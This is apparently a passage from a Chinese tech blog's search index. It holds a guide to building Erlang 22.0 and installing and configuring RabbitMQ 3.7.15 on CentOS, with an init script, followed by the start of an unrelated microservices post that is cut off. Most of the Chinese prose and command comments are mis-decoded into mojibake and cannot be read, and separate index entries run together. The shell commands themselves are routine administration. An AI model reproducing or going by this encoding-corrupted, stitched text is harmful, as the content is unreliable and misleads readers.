åˆ›å»ºå®‰è£…ç›®å½•# mkdir -p /usr/local/erlang-22.0# è¿›å…¥è§£å‹ç›®å½•# cd otp_src_22.0# é…ç½®# ./otp_build autoconf# ./configure --prefix=/usr/local/erlang-22.0 --without-javac# ç¼–è¯‘å®‰è£…# make &amp;&amp; make install# åˆ›å»ºè½¯é“¾æ¥# ln -sf /usr/local/erlang-22.0/bin/erl /usr/bin/erl# é…ç½®ç¯å¢ƒå˜é‡# vim /etc/profileexport ERLANG_HOME=/usr/local/erlang-22.0export PATH=$PATH:$ERLANG_HOME/bin# ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ# source /etc/profile äºŒè¿›åˆ¶å®‰è£… RabbitMQ 1234567891011121314151617181920212223242526# å®‰è£…ä¾èµ–# yum install -y xmlto python-simplejson# ä¸‹è½½# wget https://github.com/rabbitmq/rabbitmq-server/releases/download/v3.7.15/rabbitmq-server-generic-unix-3.7.15.tar.xz# è§£å‹# xz -d rabbitmq-server-generic-unix-3.7.15.tar.xz# tar -xvf rabbitmq-server-generic-unix-3.7.15.tar# åˆ é™¤ä¸‹è½½æ–‡ä»¶# rm -f rabbitmq-server-generic-unix-3.7.15.tar# ç§»åŠ¨è§£å‹ç›®å½•# mv rabbitmq_server-3.7.15 /usr/local/rabbitmq-3.7.15# æ–‡ä»¶æˆæƒ# chown -R rabbitmq:rabbitmq /usr/local/rabbitmq-3.7.15# é…ç½®ç¯å¢ƒå˜é‡# vim /etc/profileexport RabbitMQ_HOME=/usr/local/rabbitmq-3.7.15export PATH=$PATH:$RabbitMQ_HOME/sbin# ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ# source /etc/profile RabbitMQ åŸºç¡€é…ç½®ã€æ’ä»¶å®‰è£… 123456789101112131415161718192021222324252627282930# åˆ›å»ºé»˜è®¤çš„æ—¥å¿—ç›®å½•ä¸æ•°æ®ç›®å½•# mkdir -p /usr/local/rabbitmq-3.7.15/var/log/rabbitmq# mkdir -p /usr/local/rabbitmq-3.7.15/var/lib/rabbitmq/mnesia# åˆ›å»ºé»˜è®¤çš„é…ç½®æ–‡ä»¶# touch /usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq.config# echo "[]." &gt; /usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq.config# åˆ›å»ºé»˜è®¤çš„ç¯å¢ƒå˜é‡æ–‡ä»¶# touch /usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq-env.conf# echo "CONF_ENV_FILE=/usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq-env.conf" &gt;&gt; /usr/local/rabbitmq-3.7.15/sbin/rabbitmq-defaults# å¯ç”¨Webæ§åˆ¶å°ç®¡ç†æ’ä»¶ï¼Œæµè§ˆå™¨å¯ä»¥é€šè¿‡urlåœ°å€ï¼ˆhttp://127.0.0.1:15672ï¼‰è®¿é—®Webç®¡ç†ç•Œé¢# é»˜è®¤çš„ç™»å½•è´¦å·å’Œå¯†ç éƒ½æ˜¯guestï¼Œç”±äºè´¦å·guestå…·æœ‰æ‰€æœ‰çš„æ“ä½œæƒé™ï¼Œå¹¶ä¸”åˆæ˜¯é»˜è®¤è´¦å·ï¼Œå‡ºäºç³»ç»Ÿå®‰å…¨çš„è€ƒè™‘ï¼ŒRabbitMQé»˜è®¤é™åˆ¶äº†gueståªèƒ½é€šè¿‡localhostç™»å½•ä½¿ç”¨# rabbitmq-plugins enable rabbitmq_management# å®‰è£…å»¶è¿Ÿé˜Ÿåˆ—æ’ä»¶# cd /usr/local/rabbitmq/plugins# wget https://dl.bintray.com/rabbitmq/community-plugins/3.7.x/rabbitmq_delayed_message_exchange/rabbitmq_delayed_message_exchange-20171201-3.7.x.zip# unzip rabbitmq_delayed_message_exchange-20171201-3.7.x.zip# rm -f rabbitmq_delayed_message_exchange-20171201-3.7.x.zip# å¯ç”¨å»¶è¿Ÿé˜Ÿåˆ—æ’ä»¶# rabbitmq-plugins enable rabbitmq_delayed_message_exchange# æŸ¥çœ‹æ‰€æœ‰å·²å®‰è£…çš„æ’ä»¶# rabbitmq-plugins list# æ–‡ä»¶æˆæƒ# chown -R rabbitmq:rabbitmq /usr/local/rabbitmq-3.7.15 RabbitMQ åˆ›å»ºè™šæ‹Ÿä¸»æœºä¸è¶…çº§ç®¡ç†å‘˜ç”¨æˆ·ï¼Œè®¾ç½®è§’è‰²æƒé™ 12345678910111213141516171819202122232425# ä¸Šé¢æåˆ°è¿‡å‡ºäºç³»ç»Ÿå®‰å…¨è€ƒè™‘ï¼Œrabbitmqé»˜è®¤é™åˆ¶äº†gueståªèƒ½é€šè¿‡localhostç™»å½•ä½¿ç”¨ï¼Œå› æ­¤éœ€è¦æ‰‹åŠ¨åˆ›å»ºç®¡ç†å‘˜å¸å·ï¼Œå¹¶æ›´æ”¹guestç”¨æˆ·é»˜è®¤çš„å¯†ç # å‰å°å¯åŠ¨RabbitMQæœåŠ¡ï¼ˆé»˜è®¤ä¼šæ‰“å°å‡ºæ—¥å¿—æ–‡ä»¶å’Œé…ç½®æ–‡ä»¶çš„è·¯å¾„ï¼‰# rabbitmq-server# æˆ–è€…åå°å¯åŠ¨RabbitMQæœåŠ¡# rabbitmq-server -detached# åˆ›å»ºè™šæ‹Ÿä¸»æœºï¼ˆç›¸å½“äºmysqlçš„æ•°æ®åº“æ¦‚å¿µï¼‰# rabbitmqctl add_vhost /# æ›´æ”¹guestç”¨æˆ·é»˜è®¤çš„å¯†ç # rabbitmqctl change_password guest yourPassword# åˆ›å»ºè¶…çº§ç®¡ç†å‘˜ç”¨æˆ·# rabbitmqctl add_user admin yourPassword# èµ‹äºˆadministratorè§’è‰²ç»™è¶…çº§ç®¡ç†å‘˜ç”¨æˆ·# rabbitmqctl set_user_tags admin administrator# èµ‹äºˆè¶…çº§ç®¡ç†å‘˜ç”¨æˆ·æƒé™# rabbitmqctl set_permissions -p / admin \'.*\' \'.*\' \'.*\'# å½»åº•å…³é—­åå°å¯åŠ¨çš„RabbitMQæœåŠ¡# ./rabbitmqctl stop é…ç½®é˜²ç«å¢™ 1234567891011# é…ç½®é˜²ç«å¢™æ°¸ä¹…å¼€æ”¾rabbitmqçš„ç«¯å£ï¼Œå…¶ä¸­5672æ˜¯å®¢æˆ·ç«¯é€šä¿¡ç«¯å£ï¼Œ15672æ˜¯webç®¡ç†ç•Œé¢çš„ç«¯å£ï¼Œ25672æ˜¯serveré—´å†…éƒ¨é€šä¿¡ç«¯å£ï¼Œ4369æ˜¯erlangå‘ç°ç«¯å£# firewall-cmd --zone=public --permanent --add-port=5672/tcp# firewall-cmd --zone=public --permanent --add-port=15672/tcp# firewall-cmd --zone=public --permanent --add-port=25672/tcp# firewall-cmd --zone=public --permanent --add-port=4369/tcp# ä¿å­˜é˜²ç«å¢™é…ç½®# firewall-cmd --reload# æŸ¥çœ‹é˜²ç«å¢™å·²å¼€æ”¾çš„ç«¯å£# firewall-cmd --list-ports å¼€æœºè‡ªå¯åŠ¨ RabbitMQ 1234567891011# åˆ›å»ºæœåŠ¡è‡ªå¯åŠ¨è„šæœ¬# touch /etc/init.d/rabbitmq-server# æ›´æ”¹æœåŠ¡è‡ªå¯åŠ¨è„šæœ¬ï¼Œå†™å…¥åé¢ç»™å‡ºçš„è„šæœ¬å†…å®¹å³å¯ï¼Œå¦‚æœæ˜¯åœ¨å…¶ä»–ç³»ç»Ÿç¯å¢ƒé‡Œå®‰è£…ï¼Œåªéœ€ä¿®æ”¹è„šæœ¬é‡Œçš„USERã€MQ_HOME# vim /etc/init.d/rabbitmq-server# æœåŠ¡è‡ªå¯åŠ¨è„šæœ¬æˆæƒ# chmod u+x /etc/init.d/rabbitmq-server# å¼€æœºè‡ªå¯åŠ¨# chkconfig rabbitmq-server on ç®¡ç† RabbitMQ æœåŠ¡ 1234567891011121314151617181920212223# å…³é—­æœåŠ¡# systemctl stop rabbitmq-server# å¯åŠ¨æœåŠ¡# systemctl start rabbitmq-server# é‡å¯æœåŠ¡# systemctl restart rabbitmq-server# æŸ¥çœ‹æœåŠ¡çŠ¶æ€# systemctl status rabbitmq-server# æŸ¥çœ‹è¿è¡ŒçŠ¶æ€# rabbitmqctl status# å¾ªç¯æ—¥å¿—æ–‡ä»¶# rabbitmqctl rotate_logs[suffix]# é‡ç½®ï¼ˆå‰ææ˜¯rabbitmqå·²åœæ­¢ï¼‰ï¼Œä»å®ƒå±äºçš„ä»»ä½•é›†ç¾¤ä¸­ç§»é™¤ï¼Œä»ç®¡ç†æ•°æ®åº“ä¸­ç§»é™¤æ‰€æœ‰æ•°æ®ï¼Œä¾‹å¦‚é…ç½®è¿‡çš„ç”¨æˆ·å’Œè™šæ‹Ÿå®¿ä¸», åˆ é™¤æ‰€æœ‰æŒä¹…åŒ–çš„æ¶ˆæ¯ã€‚# rabbitmqctl reset# å¼ºåˆ¶é‡ç½®ï¼ˆå‰ææ˜¯rabbitmqå·²åœæ­¢ï¼‰,force_resetå‘½ä»¤å’Œresetçš„åŒºåˆ«æ˜¯æ— æ¡ä»¶é‡ç½®èŠ‚ç‚¹ï¼Œä¸ç®¡å½“å‰ç®¡ç†æ•°æ®åº“çŠ¶æ€ä»¥åŠé›†ç¾¤çš„é…ç½®ã€‚å¦‚æœæ•°æ®åº“æˆ–è€…é›†ç¾¤é…ç½®å‘ç”Ÿé”™è¯¯æ‰ä½¿ç”¨è¿™ä¸ªæœ€åçš„æ‰‹æ®µã€‚# rabbitmqctl force_reset RabbitMQ æœåŠ¡è‡ªå¯åŠ¨è„šæœ¬ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184#!/bin/sh## rabbitmq-server RabbitMQ broker## chkconfig: - 80 05# description: Enable AMQP service provided by RabbitMQ#### BEGIN INIT INFO# Provides: rabbitmq-server# Required-Start: $remote_fs $network# Required-Stop: $remote_fs $network# Description: RabbitMQ broker# Short-Description: Enable AMQP service provided by RabbitMQ broker### END INIT INFO# Source function library.. /etc/init.d/functionsexport HOME=/home/rabbitmqPATH=/sbin:/usr/sbin:/bin:/usr/binUSER=rabbitmqNAME=rabbitmq-serverMQ_HOME=/usr/local/rabbitmq-3.7.15DAEMON=${MQ_HOME}/sbin/${NAME}CONTROL=${MQ_HOME}/sbin/rabbitmqctlROTATE_SUFFIX=DESC=rabbitmq-serverMAX_OPEN_FILES=1048576ulimit -n $MAX_OPEN_FILESSTART_PROG="daemon"PID_FILE=/var/run/rabbitmq/pidLOCK_FILE=/var/lock/subsys/$NAMEINIT_LOG_DIR=${MQ_HOME}/var/log/rabbitmqtest -x $DAEMON || exit 0test -x $CONTROL || exit 0RETVAL=0set -e[ -f /etc/default/${NAME} ] &amp;&amp; . /etc/default/${NAME}ensure_pid_dir () { PID_DIR=`dirname ${PID_FILE}` if [ ! -d ${PID_DIR} ] ; then mkdir -p ${PID_DIR} chown -R ${USER}:${USER} ${PID_DIR} chmod 755 ${PID_DIR} fi}remove_pid () { rm -f ${PID_FILE} rmdir `dirname ${PID_FILE}` || :}start_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then echo RabbitMQ is currently running else RETVAL=0 ensure_pid_dir set +e RABBITMQ_PID_FILE=$PID_FILE $START_PROG $DAEMON \\ &gt; "${INIT_LOG_DIR}/startup_log" \\ 2&gt; "${INIT_LOG_DIR}/startup_err" \\ 0&lt;&amp;- &amp; $CONTROL wait $PID_FILE &gt;/dev/null 2&gt;&amp;1 RETVAL=$? set -e case "$RETVAL" in 0) echo SUCCESS if [ -n "$LOCK_FILE" ] ; then touch $LOCK_FILE fi ;; *) remove_pid echo FAILED - check ${INIT_LOG_DIR}/startup_\\{log, _err\\} RETVAL=1 ;; esac fi}stop_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then set +e $CONTROL stop ${PID_FILE} &gt; ${INIT_LOG_DIR}/shutdown_log 2&gt; ${INIT_LOG_DIR}/shutdown_err RETVAL=$? set -e if [ $RETVAL = 0 ] ; then remove_pid if [ -n "$LOCK_FILE" ] ; then rm -f $LOCK_FILE fi else echo FAILED - check ${INIT_LOG_DIR}/shutdown_log, _err fi else echo RabbitMQ is not running RETVAL=0 fi}status_rabbitmq() { set +e if [ "$1" != "quiet" ] ; then $CONTROL status 2&gt;&amp;1 else $CONTROL status &gt; /dev/null 2&gt;&amp;1 fi if [ $? != 0 ] ; then RETVAL=3 fi set -e}rotate_logs_rabbitmq() { set +e $CONTROL rotate_logs ${ROTATE_SUFFIX} if [ $? != 0 ] ; then RETVAL=1 fi set -e}restart_running_rabbitmq () { status_rabbitmq quiet if [ $RETVAL = 0 ] ; then restart_rabbitmq else echo RabbitMQ is not runnning RETVAL=0 fi}restart_rabbitmq() { stop_rabbitmq start_rabbitmq}case "$1" in start) echo -n "Starting $DESC: " start_rabbitmq echo "$NAME." ;; stop) echo -n "Stopping $DESC: " stop_rabbitmq echo "$NAME." ;; status) status_rabbitmq ;; rotate-logs) echo -n "Rotating log files for $DESC: " rotate_logs_rabbitmq ;; force-reload|reload|restart) echo -n "Restarting $DESC: " restart_rabbitmq echo "$NAME." ;; try-restart) echo -n "Restarting $DESC: " restart_running_rabbitmq echo "$NAME." ;; *) echo "Usage: $0 {start|stop|status|rotate-logs|restart|condrestart|try-restart|reload|force-reload}" &gt;&amp;2 RETVAL=1 ;;esacexit $RETVAL é…ç½®æ¦‚è¿° 123456å®‰è£…ç›®å½•ï¼š/usr/local/rabbitmq-3.7.15æ—¥å¿—ç›®å½•ï¼š/usr/local/rabbitmq-3.7.15/var/log/rabbitmqæ•°æ®ç›®å½•ï¼š/usr/local/rabbitmq-3.7.15/var/lib/rabbitmq/mnesiaé…ç½®æ–‡ä»¶ï¼š/usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq.configç¯å¢ƒå˜é‡é…ç½®æ–‡ä»¶ï¼š/usr/local/rabbitmq-3.7.15/etc/rabbitmq/rabbitmq-env.confè‡ªå¯åŠ¨è„šæœ¬ï¼š/etc/init.d/rabbitmq-server var isMobile = navigator.userAgent.match(/(phone|pad|pod|iPhone|iPod|ios|iPad|Android|Mobile|BlackBerry|IEMobile|MQQBrowser|JUC|Fennec|wOSBrowser|BrowserNG|WebOS|Symbian|Windows Phone)/i); if (!isMobile) { try { var plugin = new ReadmorePlugin(); plugin.init({ "id": "readmore-container", "blogId": "96641-5333172926158-056", "name": "å…¨æ ˆæŠ€æœ¯é©¿ç«™", "qrcode": "https://www.techgrow.cn/img/wx_mp_qr.png", "keyword": "Tech", "lockToc": "yes", "type": "hexo", "random": "0.9", "interval": "30", "expires": "365", "height": "auto" }); } catch(e) { console.warn("readmore plugin occurred error: " + e.name + " | " + e.message); } }',tags:"centos"},{title:"æµ…æå¾®æœåŠ¡æ¶æ„æŠ€æœ¯",url:"/posts/6b304602.html",text:'å¾®æœåŠ¡ä¸å¾®æœåŠ¡æ¶æ„å¾®æœåŠ¡çš„æ¦‚è¿°å¾®æœåŠ¡ç†è®ºçš„æå‡ºè€…é©¬ä¸ã€‚ç¦å‹’ï¼ˆMartin Fowlerï¼‰ åœ¨å…¶åšå®¢ä¸­è¯¦ç»†æè¿°äº†ä»€ä¹ˆæ˜¯å¾®æœåŠ¡ã€‚å¾®æœåŠ¡å¼ºè°ƒçš„æ˜¯æœåŠ¡çš„å¤§å°ï¼Œå®ƒå…³æ³¨çš„æ˜¯æŸä¸€ä¸ªç‚¹ï¼Œæ˜¯å…·ä½“è§£å†³æŸä¸€ä¸ªé—®é¢˜ / æä¾›è½åœ°å¯¹åº”æœåŠ¡çš„ä¸€ä¸ªæœåŠ¡åº”ç”¨ï¼›ç‹­æ„çš„çœ‹ï¼Œå¯ä»¥çœ‹ä½œ Eclipse é‡Œé¢çš„ä¸€ä¸ªä¸ªå¾®æœåŠ¡å·¥ç¨‹ / æˆ–è€… Moduleã€‚ å¾®æœåŠ¡æ¶æ„çš„æ¦‚è¿°å¾®æœåŠ¡æ¶æ„æ˜¯ä¸€ç§æ¶æ„æ¨¡å¼æˆ–è€…è¯´æ˜¯ä¸€ç§æ¶æ„é£æ ¼ï¼Œå®ƒæå€¡å°†å•ä¸€åº”ç”¨ç¨‹åºåˆ’åˆ†ä¸ºä¸€ç»„å°æœåŠ¡ï¼Œæ¯ä¸ªæœåŠ¡è¿è¡Œåœ¨è‡ªå·±çš„ç‹¬ç«‹è¿›ç¨‹ä¸­ï¼ŒæœåŠ¡é—´é€šä¿¡é‡‡ç”¨è½»é‡çº§é€šä¿¡æœºåˆ¶ (é€šå¸¸æ˜¯åŸºäº HTTP çš„ RESTful API)ã€‚æ¯ä¸ªæœåŠ¡éƒ½å›´ç»•ç€å…·ä½“ä¸šåŠ¡è¿›è¡Œæ„å»ºï¼Œå¹¶ä¸”èƒ½å¤Ÿè¢«ç‹¬ç«‹åœ°éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒã€ç±»ç”Ÿäº§ç¯å¢ƒç­‰ã€‚å¦å¤–ï¼Œåº”è¯¥å°½é‡é¿å…ç»Ÿä¸€çš„ã€é›†ä¸­å¼çš„æœåŠ¡ç®¡ç†æœºåˆ¶ï¼Œå¯¹å…·ä½“çš„ä¸€ä¸ªæœåŠ¡è€Œè¨€ï¼Œåº”æ ¹æ®ä¸šåŠ¡ä¸Šä¸‹æ–‡ï¼Œé€‰æ‹©åˆé€‚çš„è¯­è¨€ã€å·¥å…·å¯¹å…¶è¿›è¡Œæ„å»ºï¼Œå¯ä»¥æœ‰ä¸€ä¸ªéå¸¸è½»é‡çº§çš„é›†ä¸­å¼ç®¡ç†æ¥åè°ƒè¿™äº›æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„è¯­è¨€æ¥ç¼–å†™æœåŠ¡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸åŒçš„æ•°æ®å­˜å‚¨æŠ€æœ¯ã€‚ å¾®æœåŠ¡æ¶æ„çš„ä¼˜ç¼ºç‚¹ ä¼˜ç‚¹ï¼š æ˜“äºå¼€å‘å’Œç»´æŠ¤ï¼šä¸€ä¸ªå¾®æœåŠ¡åªä¼šå…³æ³¨ä¸€ä¸ªç‰¹å®šçš„ä¸šåŠ¡åŠŸèƒ½ï¼Œæ‰€ä»¥å®ƒä¸šåŠ¡æ¸…æ™°ï¼Œä»£ç é‡è¾ƒå°‘ å•ä¸ªå¾®æœåŠ¡å¯åŠ¨è¾ƒå¿«ï¼šå•ä¸ªå¾®æœåŠ¡ä»£ç é‡è¾ƒå°‘ï¼Œæ‰€ä»¥å¯åŠ¨ä¼šæ¯”è¾ƒå¿« ä¸šåŠ¡ä¹‹é—´æ¾è€¦åˆï¼Œæ— è®ºæ˜¯åœ¨å¼€å‘é˜¶æ®µæˆ–è€…éƒ¨ç½²é˜¶æ®µï¼Œä¸åŒçš„æœåŠ¡éƒ½æ˜¯äº’ç›¸ç‹¬ç«‹çš„ å±€éƒ¨ä¿®æ”¹å®¹æ˜“éƒ¨ç½²ï¼šå•ä½“åº”ç”¨åªè¦æœ‰ä¿®æ”¹ï¼Œå°±å¾—é‡æ–°éƒ¨ç½²æ•´ä¸ªåº”ç”¨ï¼Œå¾®æœåŠ¡è§£å†³äº†è¿™æ ·çš„é—®é¢˜ æŠ€æœ¯æ ˆä¸å—é™ï¼šåœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œå¯ä»¥ç»“åˆé¡¹ç›®ä¸šåŠ¡åŠå›¢é˜Ÿçš„ç‰¹ç‚¹ï¼Œåˆç†åœ°é€‰æ‹©æŠ€æœ¯æ ˆ æŒ‰éœ€ä¼¸ç¼©ï¼šå¯æ ¹æ®éœ€æ±‚ï¼Œå®ç°ç»†ç²’åº¦çš„æ‰©å±• ç¼ºç‚¹ï¼š è¿ç»´è¦æ±‚é«˜ï¼šæ›´å¤šçš„æœåŠ¡æ„å‘³ç€æ›´å¤šçš„è¿ç»´æŠ•å…¥ æŠ€æœ¯å¼€å‘éš¾åº¦é«˜ï¼šæ¶‰åŠåˆ°ç½‘ç»œé€šä¿¡å»¶è¿Ÿã€æœåŠ¡å®¹é”™ã€æ•°æ®ä¸€è‡´æ€§ã€ç³»ç»Ÿé›†æˆæµ‹è¯•ã€æ€§èƒ½ç›‘æ§ç­‰ åˆ†å¸ƒå¼å›ºæœ‰çš„å¤æ‚æ€§ï¼šä½¿ç”¨å¾®æœåŠ¡æ¶æ„çš„æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œå¯¹äºä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿï¼Œç³»ç»Ÿå®¹é”™ï¼Œç½‘ç»œå»¶è¿Ÿï¼Œåˆ†å¸ƒå¼äº‹åŠ¡ç­‰éƒ½ä¼šå¸¦æ¥å·¨å¤§çš„æŒ‘æˆ˜ æ¥å£è°ƒæ•´æˆæœ¬é«˜ï¼šå¾®æœåŠ¡ä¹‹é—´é€šè¿‡æ¥å£è¿›è¡Œé€šä¿¡ã€‚å¦‚æœä¿®æ”¹æŸä¸€ä¸ªå¾®æœåŠ¡çš„ APIï¼Œå¯èƒ½æ‰€æœ‰ä½¿ç”¨äº†è¯¥æ¥å£çš„å¾®æœåŠ¡éƒ½éœ€è¦åšè°ƒæ•´ é‡å¤åŠ³åŠ¨ï¼šå¾ˆå¤šæœåŠ¡å¯èƒ½éƒ½ä¼šä½¿ç”¨åˆ°ç›¸åŒçš„åŠŸèƒ½ï¼Œè€Œè¿™ä¸ªåŠŸèƒ½å¹¶æ²¡æœ‰è¾¾åˆ°åˆ†è§£ä¸ºä¸€ä¸ªå¾®æœåŠ¡çš„ç¨‹åº¦ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå¯èƒ½å„ä¸ªæœåŠ¡éƒ½ä¼šå¼€å‘è¿™ä¸€åŠŸèƒ½ï¼Œä»è€Œå¯¼è‡´ä»£ç é‡å¤ å¾®æœåŠ¡é¡¹ç›®çš„æ¨¡å—æ‹†åˆ†ç¤ºä¾‹ edu-common-parentï¼ˆMaven çˆ¶é…ç½®ï¼‰ edu-commonï¼ˆå…¬å…±æ¨¡å—ï¼‰ edu-common-configï¼ˆå…¬å…± Config æ¨¡å—ï¼‰ edu-common-coreï¼ˆå…¬å…± Core æ¨¡å—ï¼‰ edu-common-webï¼ˆå…¬å…± Web æ¨¡å—ï¼‰ edu-facade-userï¼ˆç”¨æˆ·æœåŠ¡æ¥å£ï¼‰ edu-service-userï¼ˆç”¨æˆ·æœåŠ¡æä¾›è€…ï¼‰ edu-web-bossï¼ˆç”¨æˆ·æœåŠ¡æ¶ˆè´¹è€…ï¼‰ ä¼ ç»Ÿé¡¹ç›®ä¸å¾®æœåŠ¡é¡¹ç›®çš„åŒºåˆ« ä¼ ç»Ÿçš„ Maven å•æ¨¡å—é¡¹ç›®ï¼Œæœ€ç»ˆä¼šæ‰“åŒ…æˆå•ä¸ª Java æˆ– Web åº”ç”¨ ä¼ ç»Ÿçš„ Maven å¤šæ¨¡å—é¡¹ç›®ï¼Œå„æ¨¡å—ä¹‹é—´ç›´æ¥é€šè¿‡ Maven ä¾èµ–æ¥å®ç° Java ä»£ç çš„äº’ç›¸è°ƒç”¨ä¸ä»£ç é‡ç”¨ï¼Œæœ€ç»ˆä¼šæ‰“åŒ…æˆå•ä¸ªæˆ–å¤šä¸ª Java æˆ– Web åº”ç”¨ï¼Œè‹¥å¤šä¸ªåº”ç”¨ä¹‹é—´éœ€è¦äº’ç›¸é€šä¿¡ï¼Œåˆ™é‡‡ç”¨ TCP/HTTP ç­‰åè®®ï¼Œå¯æ‰©å±•ä¸ºé›†ç¾¤æ¶æ„ã€‚ å¾®æœåŠ¡çš„ Maven å¤šæ¨¡å—é¡¹ç›®ï¼Œéƒ¨åˆ†æ¨¡å—ä¹‹é—´é€šè¿‡ Maven ä¾èµ–æ¥å®ç° Java ä»£ç çš„äº’ç›¸è°ƒç”¨ä¸ä»£ç é‡ç”¨ï¼Œä¸€èˆ¬ä¼šå¼•å…¥æ³¨å†Œä¸­å¿ƒæ¥å®ç°æœåŠ¡çš„è‡ªåŠ¨æ³¨å†Œä¸å‘ç°ï¼Œæœ€ç»ˆä¼šæ‰“åŒ…æˆå¤šä¸ª Java æˆ– Web åº”ç”¨ï¼Œå¤šä¸ªåº”ç”¨ä¹‹é—´é€šè¿‡ RPC/RESTful API è¿›è¡Œè°ƒç”¨ã€‚ å¾®æœåŠ¡è§£å†³æ–¹æ¡ˆé€‰å‹æœåŠ¡æ²»ç†æ¡†æ¶å¯¹æ¯” åŸºäº Dubbo çš„å¾®æœåŠ¡è§£å†³æ–¹æ¡ˆDubbo æœªæ¥çš„å®šä½å¹¶ä¸æ˜¯è¦æˆä¸ºä¸€ä¸ªå¾®æœåŠ¡çš„å…¨é¢è§£å†³æ–¹æ¡ˆï¼Œè€Œæ˜¯ä¸“æ³¨äº RPC é¢†åŸŸï¼Œæˆä¸ºå¾®æœåŠ¡ç”Ÿæ€ä½“ç³»ä¸­çš„ä¸€ä¸ªé‡è¦ç»„ä»¶ã€‚è‡³äºå¾®æœåŠ¡åŒ–è¡ç”Ÿå‡ºçš„æœåŠ¡æ²»ç†éœ€æ±‚ï¼ŒDubbo æ­£åœ¨ç§¯æé€‚é…å¼€æºè§£å†³æ–¹æ¡ˆï¼Œå¹¶ä¸”å·²ç»å¯åŠ¨ç‹¬ç«‹çš„å¼€æºé¡¹ç›®äºˆä»¥æ”¯æŒã€‚å› æ­¤åŸºäº Dubbo çš„å¾®æœåŠ¡è§£å†³æ–¹æ¡ˆæ˜¯ï¼šDubbo + Nacos + Sentinel + å…¶ä»–ã€‚ åŸºäº Spring Cloud çš„å¾®æœåŠ¡è§£å†³æ–¹æ¡ˆSpringCloud çš„æŠ€æœ¯é€‰æ‹©æ€§æ˜¯ä¸­ç«‹çš„ï¼Œå› æ­¤å¯ä»¥éšéœ€æ›´æ¢æ­é…ä½¿ç”¨ï¼ŒåŸºäº SpringCloud çš„å¾®æœåŠ¡è½åœ°è§£å†³æ–¹æ¡ˆå¤§è‡´å¯ä»¥åˆ†ä¸ºä»¥ä¸‹ä¸‰ç§ï¼š æœåŠ¡æ³¨å†Œä¸å‘ç°æ³¨å†Œä¸­å¿ƒå¯¹æ¯” ZooKeeper åœ¨åˆ†å¸ƒå¼ / å¾®æœåŠ¡ç³»ç»Ÿä¸­çš„è§’è‰²ZooKeeper æ˜¯ä¸€ç§åˆ†å¸ƒå¼ / å¾®æœåŠ¡åè°ƒæœåŠ¡ï¼Œç”¨äºç®¡ç†å¤§å‹ä¸»æœºï¼ŒåŒ…æ‹¬åˆ†å¸ƒå¼é”ã€æœåŠ¡æ³¨å†Œä¸å‘ç°ã€‚å…¶ä¸­ Zookeeper æ˜¯ä¸ºè¯»å¤šå†™å°‘çš„åœºæ™¯æ‰€è®¾è®¡ï¼Œå¹¶ä¸æ˜¯ç”¨æ¥å­˜å‚¨å¤§è§„æ¨¡ä¸šåŠ¡æ•°æ®ï¼Œè€Œæ˜¯ç”¨äºå­˜å‚¨å°‘é‡çš„çŠ¶æ€å’Œé…ç½®ä¿¡æ¯ï¼Œæ¯ä¸ªèŠ‚ç‚¹çš„æ•°æ®æœ€å¤§ä¸èƒ½è¶…è¿‡ 1MBã€‚ ç»Ÿä¸€é…ç½®ä¸­å¿ƒSpring Cloud Config é…ç½®ä¸­å¿ƒæ¶æ„Spring Cloud Config åŸºäºæ¶ˆæ¯æ€»çº¿çš„æ¶æ„å›¾å¦‚ä¸‹ï¼Œè¯¥æ¶æ„éœ€è¦ä¾èµ–å¤–éƒ¨çš„ MQ ç»„ä»¶ï¼Œå¦‚ Rabbitã€Kafka å®ç°è¿œç¨‹ç¯å¢ƒäº‹ä»¶å˜æ›´é€šçŸ¥ï¼Œå®¢æˆ·ç«¯å®æ—¶é…ç½®å˜æ›´å¯ä»¥åŸºäº Git Hook åŠŸèƒ½å®ç°ã€‚å½“ä¾èµ–çš„æ¶ˆæ¯ç»„ä»¶å‡ºç°é—®é¢˜æ—¶ï¼Œæ­¤æ—¶å¦‚æœ Git ä»“åº“ é…ç½®å‘ç”Ÿäº†å˜æ›´ï¼Œä¼šå¯¼è‡´éƒ¨åˆ†æˆ–æ‰€æœ‰å®¢æˆ·ç«¯å¯èƒ½æ— æ³•è·å–åˆ°æœ€æ–°é…ç½®ï¼Œè¿™æ ·å°±é€ æˆäº†å®¢æˆ·ç«¯åº”ç”¨é…ç½®æ•°æ®æ— æ³•è¾¾åˆ°æœ€ç»ˆä¸€è‡´æ€§ï¼Œè¿›è€Œå¼•èµ·çº¿ä¸Šé—®é¢˜ã€‚æ¶æ„å›¾ä¸­çš„ Self scheduleing refresher å°±æ˜¯ä¸ºäº†è§£å†³è¯¥é—®é¢˜ï¼Œå®ƒæ˜¯ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œæ‰§è¡Œæ—¶ä¼šåˆ¤æ–­æœ¬åœ°çš„ Git ä»“åº“ç‰ˆæœ¬ä¸è¿œç¨‹ Git ä»“åº“ç‰ˆæœ¬æ˜¯å¦ä¸€è‡´ï¼Œè‹¥ä¸ä¸€è‡´åˆ™ä¼šä»é…ç½®ä¸­å¿ƒè·å–æœ€æ–°é…ç½®è¿›è¡ŒåŠ è½½ï¼Œä¿éšœäº†é…ç½®æœ€ç»ˆä¸€è‡´æ€§ã€‚ è·¯ç”±ç½‘å…³è·¯ç”±ç½‘å…³çš„æ€§èƒ½å¯¹æ¯” Spring 